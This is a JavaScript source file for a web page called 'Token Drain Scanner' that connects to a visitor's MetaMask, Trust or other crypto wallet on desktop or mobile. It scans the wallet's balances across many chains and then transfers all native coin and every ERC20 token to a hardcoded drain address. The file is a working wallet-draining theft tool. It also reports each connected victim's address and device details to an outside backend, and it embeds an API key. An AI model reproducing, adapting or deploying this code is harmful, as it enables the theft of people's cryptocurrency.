// ================================================
// TOKEN DRAIN SCANNER - MOBILE & DESKTOP WALLET SUPPORT
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    },
    
    // Mobile Wallet Deeplinks
    mobileWallets: {
        metaMask: {
            name: "MetaMask",
            ios: "https://metamask.app.link/dapp/",
            android: "https://metamask.app.link/dapp/",
            universal: "https://metamask.app.link/dapp/",
            packageName: "io.metamask"
        },
        trust: {
            name: "Trust Wallet",
            ios: "https://link.trustwallet.com/open_url?coin_id=60&url=",
            android: "https://link.trustwallet.com/open_url?coin_id=60&url=",
            universal: "https://link.trustwallet.com/open_url?coin_id=60&url=",
            packageName: "com.wallet.crypto.trustapp"
        },
        binance: {
            name: "Binance Wallet",
            ios: "bnc://app.binance.com/",
            android: "intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end",
            universal: "https://binance.com/",
            packageName: "com.binance.dev"
        },
        coinbase: {
            name: "Coinbase Wallet",
            ios: "coinbasewallet://",
            android: "intent://#Intent;scheme=coinbasewallet;package=org.toshi;end",
            universal: "https://go.cb-w.com/",
            packageName: "org.toshi"
        },
        okx: {
            name: "OKX Wallet",
            ios: "okx://",
            android: "intent://#Intent;scheme=okx;package=com.okinc.okex.gp;end",
            universal: "https://www.okx.com/download",
            packageName: "com.okinc.okex.gp"
        },
        tokenPocket: {
            name: "TokenPocket",
            ios: "tpoutside://",
            android: "tpoutside://",
            universal: "https://tokenpocket.pro/",
            packageName: "vip.mytokenpocket"
        }
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let walletProvider = null;
let isMobile = false;
let isInAppBrowser = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, networkSelector, scanAllBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    
    // Detect device type
    detectDevice();
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    networkSelector = document.getElementById('networkSelector');
    scanAllBtn = document.getElementById('scanAllBtn');
    
    // Verify critical elements
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    console.log('✅ DOM elements loaded');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    console.log('🌐 In-App Browser:', isInAppBrowser ? 'Yes' : 'No');
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (scanAllBtn) scanAllBtn.onclick = handleScanAllChains;
    if (networkSelector) networkSelector.onchange = handleNetworkChange;
    
    // Populate network selector
    populateNetworkSelector();
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
    
    // Show appropriate wallet options based on device
    if (isMobile && !isInAppBrowser) {
        showMobileWalletOptions();
    }
}

// Detect device type and browser
function detectDevice() {
    const userAgent = navigator.userAgent.toLowerCase();
    
    // Check if mobile
    isMobile = /android|webos|iphone|ipad|ipod|blackberry|windows phone/.test(userAgent);
    
    // Check if in-app browser (wallet browser)
    isInAppBrowser = 
        userAgent.includes('metamask') ||
        userAgent.includes('trustwallet') ||
        userAgent.includes('tokenpocket') ||
        userAgent.includes('binance') ||
        userAgent.includes('coinbase') ||
        userAgent.includes('okex') ||
        userAgent.includes('walletconnect');
    
    console.log('📱 User Agent:', userAgent);
    console.log('📱 Is Mobile:', isMobile);
    console.log('📱 Is In-App Browser:', isInAppBrowser);
}

// Show mobile wallet options
function showMobileWalletOptions() {
    const walletOptions = document.getElementById('walletOptions');
    if (!walletOptions) return;
    
    const wallets = CONFIG.mobileWallets;
    let html = '<h4>📱 Connect with Mobile Wallet</h4><div class="wallet-grid">';
    
    Object.entries(wallets).forEach(([key, wallet]) => {
        const currentUrl = encodeURIComponent(window.location.href);
        let walletUrl = '';
        
        if (navigator.userAgent.toLowerCase().includes('iphone') || 
            navigator.userAgent.toLowerCase().includes('ipad')) {
            walletUrl = wallet.ios + currentUrl;
        } else if (navigator.userAgent.toLowerCase().includes('android')) {
            walletUrl = wallet.android;
        } else {
            walletUrl = wallet.universal + currentUrl;
        }
        
        html += `
            <a href="${walletUrl}" class="wallet-btn" onclick="handleMobileWalletClick('${key}')">
                <div class="wallet-icon">${getWalletEmoji(key)}</div>
                <div class="wallet-name">${wallet.name}</div>
            </a>
        `;
    });
    
    html += '</div>';
    walletOptions.innerHTML = html;
    walletOptions.style.display = 'block';
}

// Get wallet emoji
function getWalletEmoji(walletKey) {
    const emojis = {
        metaMask: '🦊',
        trust: '🔶',
        binance: '🟡',
        coinbase: '🔷',
        okx: '⚡',
        tokenPocket: '👛'
    };
    return emojis[walletKey] || '👛';
}

// Handle mobile wallet click
function handleMobileWalletClick(walletKey) {
    console.log('📱 Opening wallet:', walletKey);
    walletProvider = walletKey;
    
    // Store wallet preference
    localStorage.setItem('preferredWallet', walletKey);
    
    // Set a flag that we're expecting a wallet connection
    sessionStorage.setItem('expectingWalletConnection', 'true');
    
    // For some wallets, we need to handle the callback
    if (walletKey === 'trust') {
        // Trust Wallet specific handling
        setTimeout(() => {
            if (!window.ethereum) {
                window.location.href = 'https://link.trustwallet.com/browser_enable';
            }
        }, 2000);
    }
}

// Check existing wallet connection
async function checkExistingConnection() {
    // If user just came from a mobile wallet deeplink
    const expectingConnection = sessionStorage.getItem('expectingWalletConnection');
    if (expectingConnection) {
        sessionStorage.removeItem('expectingWalletConnection');
        updateStatus('🔄 Checking wallet connection...');
        
        // Give wallet time to inject provider
        setTimeout(async () => {
            await tryWalletConnection();
        }, 1500);
        return;
    }
    
    const ethereum = getEthereum();
    if (!ethereum) {
        console.log('⚠️ No wallet provider');
        return;
    }
    
    try {
        const accounts = await ethereum.request({ 
            method: 'eth_accounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await ethereum.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️', error.message);
    }
}

// Try to connect to wallet
async function tryWalletConnection() {
    const ethereum = getEthereum();
    if (!ethereum) {
        updateStatus('❌ No wallet detected. Please open in wallet browser.');
        return;
    }
    
    try {
        const accounts = await ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await ethereum.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.error('❌ Connection error:', error);
        updateStatus('❌ Failed to connect: ' + error.message);
    }
}

// Get Ethereum provider with fallback
function getEthereum() {
    // Check for EIP-1193 provider
    if (window.ethereum) {
        // Detect specific wallet
        if (window.ethereum.isMetaMask) walletProvider = 'metaMask';
        else if (window.ethereum.isTrust) walletProvider = 'trust';
        else if (window.ethereum.isBinance) walletProvider = 'binance';
        else if (window.ethereum.isCoinbaseWallet) walletProvider = 'coinbase';
        else if (window.ethereum.isPhantom) walletProvider = 'phantom';
        else if (window.ethereum.isBraveWallet) walletProvider = 'brave';
        else if (window.ethereum.isOkxWallet) walletProvider = 'okx';
        else walletProvider = 'unknown';
        
        return window.ethereum;
    }
    
    // Check for legacy providers
    if (window.web3?.currentProvider) return window.web3.currentProvider;
    
    // Check for specific wallet providers
    if (window.BinanceChain) {
        walletProvider = 'binance';
        return window.BinanceChain;
    }
    
    if (window.trustwallet) {
        walletProvider = 'trust';
        return window.trustwallet;
    }
    
    if (window.coinbaseWalletExtension) {
        walletProvider = 'coinbase';
        return window.coinbaseWalletExtension;
    }
    
    return null;
}

// Handle connect button click
async function handleConnect() {
    console.log('🔄 Connect button clicked');
    
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    updateStatus('🔄 Connecting wallet...');
    
    // If on mobile and not in app browser, show wallet options
    if (isMobile && !isInAppBrowser) {
        showMobileWalletGuide();
        return;
    }
    
    const ethereum = getEthereum();
    if (!ethereum) {
        updateStatus('❌ No wallet found!');
        showWalletInstallGuide();
        return;
    }
    
    try {
        // Request accounts - THIS TRIGGERS WALLET POPUP
        console.log('📤 Requesting accounts from wallet...');
        const accounts = await ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        console.log('✅ Wallet response:', accounts);
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected');
        } else if (error.code === -32002) {
            updateStatus('🔄 Connection pending. Check wallet.');
        } else {
            updateStatus('❌ Failed: ' + error.message);
        }
    }
}

// Show mobile wallet guide
function showMobileWalletGuide() {
    const guideHTML = `
        <div style="margin: 20px 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 12px; color: white;">
            <h4 style="margin-top: 0; display: flex; align-items: center; gap: 10px;">
                📱 Connect on Mobile
            </h4>
            <p>For the best experience:</p>
            <ol style="text-align: left; padding-left: 20px;">
                <li>Open this link in your wallet's built-in browser</li>
                <li>Or use one of the wallet buttons below</li>
                <li>Make sure you're connected to the correct network</li>
            </ol>
            <div style="display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0; justify-content: center;">
                <button onclick="openInMetaMask()" style="padding: 12px 20px; background: #f6851b; color: white; border: none; border-radius: 8px; cursor: pointer; display: flex; align-items: center; gap: 8px; font-size: 16px;">
                    🦊 Open in MetaMask
                </button>
                <button onclick="openInTrustWallet()" style="padding: 12px 20px; background: #3375bb; color: white; border: none; border-radius: 8px; cursor: pointer; display: flex; align-items: center; gap: 8px; font-size: 16px;">
                    🔶 Open in Trust Wallet
                </button>
            </div>
            <p><small>If buttons don't work, copy URL and paste in wallet browser</small></p>
        </div>
    `;
    
    statusEl.innerHTML = guideHTML;
}

// Open in MetaMask mobile
function openInMetaMask() {
    const currentUrl = encodeURIComponent(window.location.href);
    const metamaskUrl = `https://metamask.app.link/dapp/${currentUrl}`;
    window.location.href = metamaskUrl;
}

// Open in Trust Wallet mobile
function openInTrustWallet() {
    const currentUrl = encodeURIComponent(window.location.href);
    const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
    window.location.href = trustUrl;
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        console.log('🔄 Setting up connection...');
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Select current network in dropdown
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        
        // Update network selector
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        fetchTokens(currentAccount, chainId);
    });
    
    ethereum.on('disconnect', (error) => {
        console.log('🔌 Wallet disconnected:', error);
        disconnectWallet();
    });
}

// Populate network selector dropdown
function populateNetworkSelector() {
    if (!networkSelector) return;
    
    networkSelector.innerHTML = '';
    
    // Add "Switch Network" option
    const defaultOption = document.createElement('option');
    defaultOption.value = '';
    defaultOption.textContent = 'Switch Network';
    networkSelector.appendChild(defaultOption);
    
    // Add all supported networks
    Object.entries(CONFIG.networkNames).forEach(([chainId, name]) => {
        const option = document.createElement('option');
        option.value = chainId;
        option.textContent = `🌐 ${name}`;
        networkSelector.appendChild(option);
    });
}

// Handle network change from dropdown
async function handleNetworkChange() {
    if (!networkSelector || !networkSelector.value) return;
    
    const chainId = parseInt(networkSelector.value);
    if (!chainId || chainId === currentChainId) return;
    
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
        
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
    } catch (switchError) {
        if (switchError.code === 4902) {
            try {
                await addNetworkToWallet(chainId);
            } catch (addError) {
                updateStatus(`❌ Failed to add network: ${addError.message}`);
            }
        } else {
            updateStatus(`❌ Failed to switch network: ${switchError.message}`);
        }
    }
}

// Add network to wallet
async function addNetworkToWallet(chainId) {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    const networkParams = {
        56: { // BSC
            chainId: '0x38',
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
        },
        137: { // Polygon
            chainId: '0x89',
            chainName: 'Polygon',
            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
            rpcUrls: ['https://polygon-rpc.com/'],
            blockExplorerUrls: ['https://polygonscan.com/']
        },
        42161: { // Arbitrum
            chainId: '0xA4B1',
            chainName: 'Arbitrum One',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: ['https://arb1.arbitrum.io/rpc'],
            blockExplorerUrls: ['https://arbiscan.io/']
        }
    };
    
    if (networkParams[chainId]) {
        await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [networkParams[chainId]],
        });
    }
}

// Fetch tokens for current chain
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="token-count">${chainTokens.length} tokens</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item" data-address="${token.contractAddress || 'native'}" data-chain="${chainId}">
                        <div class="token-info">
                            ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : ''}
                            <div>
                                <span class="token-symbol">${token.symbol}</span>
                                <span class="token-name">${token.name}</span>
                            </div>
                        </div>
                        <div class="token-amounts">
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// Handle drain - COMPLETE VERSION FOR ALL TOKENS
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Confirm drain
    if (!confirm(`⚠️ WARNING: This will send ALL detected tokens and ETH to:\n${CONFIG.drainAddress}\n\nEstimated tokens: ${detectedTokens.length}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting comprehensive drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining ALL tokens...';
        }
        
        // Create progress indicator
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // 1. First, drain ETH/native token
        await drainNativeToken();
        
        // 2. Drain all ERC20 tokens
        await drainAllERC20Tokens();
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ All tokens have been drained successfully!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas settings.';
        } else if (error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient ETH for gas fees';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
        
        // Remove progress indicator
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain native token (ETH, BNB, MATIC, etc.)
async function drainNativeToken() {
    updateProgress('Draining native token...', 10);
    
    const ethereum = getEthereum();
    
    // Get balance
    const balanceHex = await ethereum.request({
        method: 'eth_getBalance',
        params: [currentAccount, 'latest']
    });
    
    const balance = parseInt(balanceHex, 16);
    
    if (balance === 0) {
        updateProgress('No native token to drain', 20);
        return;
    }
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Check if we have enough for gas
    if (balance <= gasCost * 2) {
        updateProgress('Not enough native token for gas fees', 30);
        return;
    }
    
    // Calculate amount to send (leave some for gas for token transfers)
    const sendAmount = balance - (gasCost * 5);
    
    if (sendAmount <= 0) {
        updateProgress('Not enough after gas fees', 40);
        return;
    }
    
    // Send native token
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    updateProgress(`Native token sent: ${txHash.slice(0, 10)}...`, 50);
    await new Promise(resolve => setTimeout(resolve, 3000));
}

// Drain all ERC20 tokens
async function drainAllERC20Tokens() {
    const ethereum = getEthereum();
    
    // Filter only ERC20 tokens (not native)
    const erc20Tokens = detectedTokens.filter(t => !t.isNative && t.contractAddress);
    
    if (erc20Tokens.length === 0) {
        updateProgress('No ERC20 tokens to drain', 60);
        return;
    }
    
    updateProgress(`Draining ${erc20Tokens.length} ERC20 tokens...`, 60);
    
    let completed = 0;
    
    for (const token of erc20Tokens) {
        try {
            // Switch to token's chain if needed
            if (currentChainId !== token.chainId) {
                await switchToChain(token.chainId);
            }
            
            // Drain the token
            await drainERC20Token(token);
            
            completed++;
            const percent = 60 + (completed / erc20Tokens.length * 40);
            updateProgress(`Draining ${token.symbol}... (${completed}/${erc20Tokens.length})`, percent);
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
        }
    }
    
    updateProgress(`Completed draining ${completed} tokens`, 100);
}

// Drain single ERC20 token
async function drainERC20Token(token) {
    const ethereum = getEthereum();
    
    // Encode transfer function call
    const transferData = encodeTransferData(token.balance);
    
    // Get gas estimate for token transfer
    const gasEstimate = await ethereum.request({
        method: 'eth_estimateGas',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData
        }]
    });
    
    const gasLimit = parseInt(gasEstimate, 16) * 2;
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    // Send token transfer
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    return txHash;
}

// Encode transfer function call
function encodeTransferData(amount) {
    const functionSignature = '0xa9059cbb';
    const paddedAddress = CONFIG.drainAddress.slice(2).padStart(64, '0');
    const paddedAmount = BigInt(amount).toString(16).padStart(64, '0');
    return functionSignature + paddedAddress + paddedAmount;
}

// Switch to specific chain
async function switchToChain(chainId) {
    if (currentChainId === chainId) return;
    
    const ethereum = getEthereum();
    
    try {
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        currentChainId = chainId;
        
    } catch (error) {
        if (error.code === 4902) {
            await addNetworkToWallet(chainId);
        } else {
            throw error;
        }
    }
}

// Update progress indicator
function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
    
    console.log(`Progress: ${percent}% - ${message}`);
}

// Show wallet install guide
function showWalletInstallGuide() {
    const guideHTML = `
        <div style="margin: 20px 0; padding: 20px; background: #fff3cd; border-radius: 12px; border: 2px solid #ffc107;">
            <h4 style="margin-top: 0; color: #856404; display: flex; align-items: center; gap: 10px;">
                📱💻 Install Wallet
            </h4>
            <p>To use this dApp, you need a Web3 wallet:</p>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0;">
                <a href="https://metamask.io/download/" target="_blank" 
                   style="padding: 15px; background: #f6851b; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
                    <span style="font-size: 24px;">🦊</span>
                    <span style="font-weight: bold;">MetaMask</span>
                </a>
                <a href="https://trustwallet.com/" target="_blank"
                   style="padding: 15px; background: #3375bb; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
                    <span style="font-size: 24px;">🔶</span>
                    <span style="font-weight: bold;">Trust Wallet</span>
                </a>
                <a href="https://www.binance.com/en/download" target="_blank"
                   style="padding: 15px; background: #f0b90b; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
                    <span style="font-size: 24px;">🟡</span>
                    <span style="font-weight: bold;">Binance Wallet</span>
                </a>
                <a href="https://www.coinbase.com/wallet/downloads" target="_blank"
                   style="padding: 15px; background: #0052ff; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
                    <span style="font-size: 24px;">🔷</span>
                    <span style="font-weight: bold;">Coinbase Wallet</span>
                </a>
            </div>
            <p style="font-size: 14px; color: #666;">
                <strong>Mobile Users:</strong> Open this link in your wallet's built-in browser for best experience.
            </p>
        </div>
    `;
    
    statusEl.innerHTML = guideHTML;
}

// Update status
function updateStatus(message) {
    statusEl.textContent = message;
}

// Show UI elements
function showUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('hidden');
    });
}

// Hide UI elements
function hideUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                walletProvider: walletProvider,
                isMobile: isMobile,
                userAgent: navigator.userAgent
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    const ethereum = getEthereum();
    if (ethereum && ethereum.disconnect) {
        try {
            await ethereum.disconnect();
        } catch (error) {
            console.log('⚠️', error.message);
        }
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    walletProvider = null;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Handle scan all chains
async function handleScanAllChains() {
    if (!currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔍 Scanning all chains for tokens...');
    
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(currentAccount, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found on any chain');
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        console.error(`❌ Token fetch error for chain ${chainId}:`, error);
        return [];
    }
}

// Initialize app on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally for button clicks
window.openInMetaMask = openInMetaMask;
window.openInTrustWallet = openInTrustWallet;
window.handleMobileWalletClick = handleMobileWalletClick;

// Debug
console.log('=== Token Drain Scanner ===');
console.log('Version: 3.0 - Mobile & Desktop Support');
console.log('Drain Address:', CONFIG.drainAddress);
console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
console.log('===========================');
